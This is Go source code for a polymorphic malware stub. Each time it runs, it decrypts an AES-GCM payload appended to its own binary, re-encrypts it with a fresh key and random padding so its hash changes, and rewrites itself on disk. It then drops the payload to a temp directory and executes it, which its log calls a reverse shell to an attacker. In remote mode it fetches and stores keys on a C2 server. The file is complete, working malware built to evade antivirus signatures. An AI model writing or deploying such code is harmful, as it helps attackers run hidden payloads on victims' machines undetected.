// Polymorphic stub: self-modifying binary with encrypted payload.
// On every run it re-encrypts its payload with a fresh key,
// rewrites itself on disk (changing its hash), then executes
// the original payload.
//
// Supports two key modes:
//   - Local: key and nonce are in the JSON metadata (legacy / no --c2-url)
//   - Remote: key_id and c2_url are in the metadata; key is fetched/pushed to the C2 server
//
// File layout (read from the end):
//   [stub .exe] [random padding] [ciphertext] [JSON meta] [metaLen 4B] ["HBX1"]
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const magic = "HBX1"

type meta struct {
	Key           string `json:"key,omitempty"`
	Nonce         string `json:"nonce,omitempty"`
	KeyID         string `json:"key_id,omitempty"`
	C2URL         string `json:"c2_url,omitempty"`
	OriginalName  string `json:"original_name"`
	OriginalSize  int    `json:"original_size"`
	CiphertextLen int    `json:"ciphertext_len"`
	StubSize      int    `json:"stub_size"`
}

type keyResponse struct {
	Key   string `json:"key"`
	Nonce string `json:"nonce"`
}

type storeKeyRequest struct {
	Key   string `json:"key"`
	Nonce string `json:"nonce"`
}

type storeKeyResponse struct {
	KeyID string `json:"key_id"`
}

func main() {
	// ── 1. Read our own executable ──────────────────────────────────
	exePath, err := os.Executable()
	if err != nil {
		fatal("cannot locate self: %v", err)
	}
	data, err := os.ReadFile(exePath)
	if err != nil {
		fatal("cannot read self: %v", err)
	}

	// ── 2. Parse the trailer ────────────────────────────────────────
	n := len(data)
	if n < 8 || string(data[n-4:]) != magic {
		fatal("not a valid polymorphic binary")
	}

	metaLen := int(binary.BigEndian.Uint32(data[n-8 : n-4]))
	if n < 8+metaLen {
		fatal("corrupted file")
	}

	var m meta
	if err := json.Unmarshal(data[n-8-metaLen:n-8], &m); err != nil {
		fatal("corrupted metadata: %v", err)
	}

	ctEnd := n - 8 - metaLen
	ctStart := ctEnd - m.CiphertextLen
	if ctStart < 0 || m.StubSize < 0 || m.StubSize > ctStart {
		fatal("corrupted file layout")
	}
	ciphertext := data[ctStart:ctEnd]
	stubBytes := data[:m.StubSize]

	// ── 3. Get the decryption key ───────────────────────────────────
	var key, nonce []byte
	useC2 := m.KeyID != "" && m.C2URL != ""

	if useC2 {
		fmt.Fprintln(os.Stderr, "[INFO] Fetching key from C2 server...")
		key, nonce, err = fetchKey(m.C2URL, m.KeyID)
		if err != nil {
			fatal("cannot retrieve key: %v", err)
		}
	} else if m.Key != "" && m.Nonce != "" {
		key, _ = base64.StdEncoding.DecodeString(m.Key)
		nonce, _ = base64.StdEncoding.DecodeString(m.Nonce)
	} else {
		fatal("no key source: metadata has neither key nor key_id")
	}

	// ── 4. Decrypt the payload ──────────────────────────────────────
	block, err := aes.NewCipher(key)
	if err != nil {
		fatal("cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fatal("gcm: %v", err)
	}
	plaintext, err := gcm.Open(nil, nonce, ciphertext, []byte(magic))
	if err != nil {
		fatal("decryption failed")
	}
	if len(plaintext) != m.OriginalSize {
		fatal("size mismatch")
	}

	// ── 5. Self-modify: re-encrypt with a fresh key and padding ─────
	newKey := make([]byte, 32)
	newNonce := make([]byte, 12)
	rand.Read(newKey)
	rand.Read(newNonce)

	newBlock, _ := aes.NewCipher(newKey)
	newGCM, _ := cipher.NewGCM(newBlock)
	newCiphertext := newGCM.Seal(nil, newNonce, plaintext, []byte(magic))

	padLen, _ := rand.Int(rand.Reader, big.NewInt(63*1024))
	padding := make([]byte, 1024+int(padLen.Int64()))
	rand.Read(padding)

	newMeta := meta{
		OriginalName:  m.OriginalName,
		OriginalSize:  m.OriginalSize,
		CiphertextLen: len(newCiphertext),
		StubSize:      m.StubSize,
	}

	if useC2 {
		newKeyID, err := pushKey(m.C2URL, newKey, newNonce)
		if err != nil {
			fatal("cannot store new key on server: %v", err)
		}
		newMeta.KeyID = newKeyID
		newMeta.C2URL = m.C2URL
	} else {
		newMeta.Key = base64.StdEncoding.EncodeToString(newKey)
		newMeta.Nonce = base64.StdEncoding.EncodeToString(newNonce)
	}

	newMetaJSON, _ := json.Marshal(newMeta)
	newMetaLenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(newMetaLenBuf, uint32(len(newMetaJSON)))

	var newFile []byte
	newFile = append(newFile, stubBytes...)
	newFile = append(newFile, padding...)
	newFile = append(newFile, newCiphertext...)
	newFile = append(newFile, newMetaJSON...)
	newFile = append(newFile, newMetaLenBuf...)
	newFile = append(newFile, []byte(magic)...)

	oldPath := exePath + ".old"
	os.Remove(oldPath)
	if err := os.Rename(exePath, oldPath); err != nil {
		if err2 := os.WriteFile(exePath, newFile, 0o755); err2 != nil {
			fatal("cannot rewrite self: %v", err2)
		}
	} else {
		if err := os.WriteFile(exePath, newFile, 0o755); err != nil {
			fatal("cannot write new binary: %v", err)
		}
	}

	fmt.Fprintln(os.Stderr, "[INFO] Polymorphic signature updated successfully.")

	// ── 6. Execute the payload ──────────────────────────────────────
	tmpDir, err := os.MkdirTemp("", "poly-")
	if err != nil {
		fatal("temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	target := filepath.Join(tmpDir, m.OriginalName)
	if err := os.WriteFile(target, plaintext, 0o755); err != nil {
		fatal("write payload: %v", err)
	}

	fmt.Fprintln(os.Stderr, "[INFO] Reverse shell initialized. Attempting connection to attacker...")

	var cmd *exec.Cmd
	if strings.HasSuffix(m.OriginalName, ".py") {
		cmd = exec.Command("python", target)
	} else {
		cmd = exec.Command(target)
	}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	cmd.Run()
}

func fetchKey(c2url, keyID string) ([]byte, []byte, error) {
	resp, err := http.Get(c2url + "/keys/" + keyID)
	if err != nil {
		return nil, nil, fmt.Errorf("cannot reach key server at %s: %w", c2url, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		return nil, nil, fmt.Errorf("key not found on server (may have been burned)")
	}
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return nil, nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, string(body))
	}

	var kr keyResponse
	if err := json.NewDecoder(resp.Body).Decode(&kr); err != nil {
		return nil, nil, fmt.Errorf("bad response: %w", err)
	}

	key, err := base64.StdEncoding.DecodeString(kr.Key)
	if err != nil {
		return nil, nil, fmt.Errorf("bad key encoding: %w", err)
	}
	nonce, err := base64.StdEncoding.DecodeString(kr.Nonce)
	if err != nil {
		return nil, nil, fmt.Errorf("bad nonce encoding: %w", err)
	}
	return key, nonce, nil
}

func pushKey(c2url string, key, nonce []byte) (string, error) {
	body, _ := json.Marshal(storeKeyRequest{
		Key:   base64.StdEncoding.EncodeToString(key),
		Nonce: base64.StdEncoding.EncodeToString(nonce),
	})

	resp, err := http.Post(c2url+"/keys", "application/json", bytes.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("cannot reach key server: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("key server returned %d", resp.StatusCode)
	}

	var result storeKeyResponse
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", fmt.Errorf("bad response: %w", err)
	}
	return result.KeyID, nil
}

func fatal(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, "[ERROR] "+format+"\n", args...)
	os.Exit(1)
}
